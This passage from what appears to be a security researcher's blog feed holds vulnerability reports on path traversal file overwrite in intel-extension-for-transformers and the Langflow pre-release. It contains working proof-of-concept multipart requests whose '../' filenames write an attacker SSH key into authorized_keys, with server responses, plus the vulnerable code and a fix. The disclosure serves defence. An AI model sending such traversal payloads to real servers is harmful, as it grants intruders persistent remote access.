+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvIlRA9q70krSRDb7
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Cookie: 
+Connection: close
+Content-Length: 409
+
+------WebKitFormBoundaryvIlRA9q70krSRDb7
+Content-Disposition: form-data; name="knowledge_base_id"
+
+123
+------WebKitFormBoundaryvIlRA9q70krSRDb7
+Content-Disposition: form-data; name="files"; filename="blob"
+Content-Type: text/plain
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
+------WebKitFormBoundaryvIlRA9q70krSRDb7
+Content-Disposition: form-data; name="file_paths"
+
+/home/kali/.ssh/authorized_keys
+------WebKitFormBoundaryvIlRA9q70krSRDb7--
+</code></pre></div></div>
+
+<p>The response indicates error but the file is written successfully.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
+Content-Length: 39
+Connection: keep-alive
+Content-Type: application/json
+Date: Mon, 27 May 2024 07:41:53 GMT
+Keep-Alive: timeout=4
+Proxy-Connection: keep-alive
+Server: uvicorn
+
+"Error occurred while uploading files."
+</code></pre></div></div>
+
+<p>We can verify the success by again checking the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
+
+<h3 id="ssh-access">SSH Access</h3>
+
+<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
+
+<h3 id="web-servers">Web Servers</h3>
+
+<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release(No Response)</title><link href="http://localhost:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release(No Response)" /><published>2024-05-26T10:31:06+08:00</published><updated>2024-05-26T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in Langflow Pre-release.</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-22: Path Traversal</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>Pre-release version: 1.0 Alpha - v1.0.0a37</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p>The post <code class="language-plaintext highlighter-rouge">/upload/{flow_id}</code> endpoint in the Langflow <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">upload_file</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">filename</code> parameter which allows the uploading of arbitrary files. The <code class="language-plaintext highlighter-rouge">filename</code> is then directly append to a directory path <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">without sanitized</a> and the file content is writen to dest location. An attacker can upload and overwrite ANY file on the filesystem. This can lead to remote code execution in many different ways.</p>
+
+<p>The vulnerable function <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34"><code class="language-plaintext highlighter-rouge">save_file</code></a>:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>async def save_file(self, flow_id: str, file_name: str, data: bytes):
+        folder_path = self.data_dir / flow_id
+        folder_path.mkdir(parents=True, exist_ok=True)
+        file_path = folder_path / file_name
+
+        try:
+            with open(file_path, "wb") as f:
+                f.write(data)
+            logger.info(f"File {file_name} saved successfully in flow {flow_id}.")
+        except Exception as e:
+            logger.error(f"Error saving file {file_name} in flow {flow_id}: {e}")
+            raise e
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ….</p>
+
+<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the langflow python API and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
+cat: /home/kali/.ssh/authorized_keys: No such file or directory
+</code></pre></div></div>
+
+<p>An attacker can now send the following request to the webserver. This request will upload the attacker’s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>
+
+<p>We start a simple server using tutorial from <a href="https://github.com/langflow-ai/langflow?tab=readme-ov-file#-installation">https://github.com/langflow-ai/langflow?tab=readme-ov-file#-installation</a>. Note that we use pre-release versoin:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install the pre-release version
+python -m pip install langflow --pre --force-reinstall
+</code></pre></div></div>
+<p>Start web interface, the default port is <code class="language-plaintext highlighter-rouge">7860</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -m langflow run
+</code></pre></div></div>
+
+<p>Then open the Langflow web interface in browser, create a new project and in the project add a file component, click the file upload button, select random text file with burpsuite intercepting the upload request. We can see the file name and file content in the multipart request body.</p>
+
+<p><img src="/assets/images/bughunter/langflow/file-component.png" alt="file-component" /></p>
+
+<p><img src="/assets/images/bughunter/langflow/file-upload.png" alt="file-upload" /></p>
+
+<p>Change the multipart <code class="language-plaintext highlighter-rouge">filename</code> to <code class="language-plaintext highlighter-rouge">../../../../../../../../../home/kali/.ssh/authorized_keys</code> and file content to our <code class="language-plaintext highlighter-rouge">authorized_keys</code> content. Repeat the upload request.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:7860/api/v1/files/upload/7e774022-0991-47f7-83a1-ef127d439755 HTTP/1.1
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjODFiMWM1Yy1lYzgxLTRkZmQtOGFiZS0yMGIxNDBmOWY3NjkiLCJleHAiOjE3NDgyMjk3NDJ9.PrPNZGIOgBql3mDBTWqmdpg4G1zYeaB-087GH5NHvYE
+Cache-Control: no-cache
+Connection: close
+Cookie: access_token_lf=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjODFiMWM1Yy1lYzgxLTRkZmQtOGFiZS0yMGIxNDBmOWY3NjkiLCJleHAiOjE3NDgyMjk3NDJ9.PrPNZGIOgBql3mDBTWqmdpg4G1zYeaB-087GH5NHvYE
+Origin: http://127.0.0.1:7860
+Pragma: no-cache
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Host: 127.0.0.1:7860
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=--------------------------636165805457578805665550
+Content-Length: 647
+
+----------------------------636165805457578805665550
+Content-Disposition: form-data; name="file"; filename="../../../../../home/kali/.ssh/authorized_keys"
+Content-Type: application/octet-stream
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
+----------------------------636165805457578805665550--
+</code></pre></div></div>
+
+<p>The response indicates success with the uploaded file path.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 201 Created
+Connection: close
+Content-Length: 146
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Origin: http://127.0.0.1:7860
+Content-Type: application/json
+Date: Sun, 26 May 2024 03:48:37 GMT
+Server: uvicorn
+Vary: Origin
+
+{"flowId":"7e774022-0991-47f7-83a1-ef127d439755","file_path":"7e774022-0991-47f7-83a1-ef127d439755/../../../../../home/kali/.ssh/authorized_keys"}
+</code></pre></div></div>
+
+<p>We can verify the success by again checking the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
+</code></pre></div></div>
+
+<h2 id="fix">Fix</h2>
+
+<p>Use <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">UUID instead of origin file name to store the file</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.post("/upload/{flow_id}", status_code=HTTPStatus.CREATED)
+async def upload_file(
+    file: UploadFile,
+    flow_id: UUID = Depends(get_flow_id),
+    storage_service: StorageService = Depends(get_storage_service),
+):
+    try:
+        flow_id_str = str(flow_id)
+        file_content = await file.read()
+        # fix the path travesal problem
+        file_name = hashlib.sha256(file_content).hexdigest()
+        folder = flow_id_str
+        await storage_service.save_file(flow_id=folder, file_name=file_name, data=file_content)
+        return UploadFileResponse(flowId=flow_id_str, file_path=f"{folder}/{file_name}")
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
+</code></pre></div></div>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>
+
+<h3 id="ssh-access">SSH Access</h3>
+
+<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>
+
+<h3 id="web-servers">Web Servers</h3>
+
+<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>
+
+<h3 id="any-bounty">Any bounty</h3>
+
+<p>Can I ask for a bug bounty award or a CVE id for this bug? Thank you very much!</p>
+
+<h2 id="reference">Reference</h2>
+
+<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47</a></p>
+
+<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
